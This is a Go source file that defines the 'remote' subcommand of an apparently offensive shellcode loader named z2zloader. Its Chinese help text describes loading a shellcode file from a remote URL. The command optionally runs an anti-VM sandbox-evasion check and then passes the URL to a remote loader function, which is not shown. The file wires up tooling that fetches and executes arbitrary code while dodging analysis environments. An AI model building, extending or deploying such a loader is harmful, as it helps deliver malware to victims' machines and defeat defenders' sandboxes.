/*
Copyright © 2024 NAME HERE <EMAIL ADDRESS>
*/
package cmd

import (
	"log"
	"z2zloader/tools"

	"github.com/spf13/cobra"
)

// remoteCmd represents the remote command
var remoteCmd = &cobra.Command{
	Use:   "remote",
	Short: "远程加载模块",
	Long: `远程加载模块使用方式:
.\z2zloader -u url`,
	Run: func(cmd *cobra.Command, args []string) {
		sandbox, _ := rootCmd.PersistentFlags().GetBool("sandbox")
		if sandbox {
			tools.AntiVM()
		}
		url, _ := cmd.Flags().GetString("url")
		tools.Remote_loader(url)
		log.Println("远程执行完毕")
	},
}

func init() {
	rootCmd.AddCommand(remoteCmd)
	remoteCmd.Flags().StringP("url", "u", "", "加载远程url下的shellcode文件")
	// Here you will define your flags and configuration settings.
	remoteCmd.MarkFlagRequired("url")
	// Cobra supports Persistent Flags which will work for this command
	// and all subcommands, e.g.:
	// remoteCmd.PersistentFlags().String("foo", "", "A help for foo")

	// Cobra supports local flags which will only run when this command
	// is called directly, e.g.:
	// remoteCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle")
}
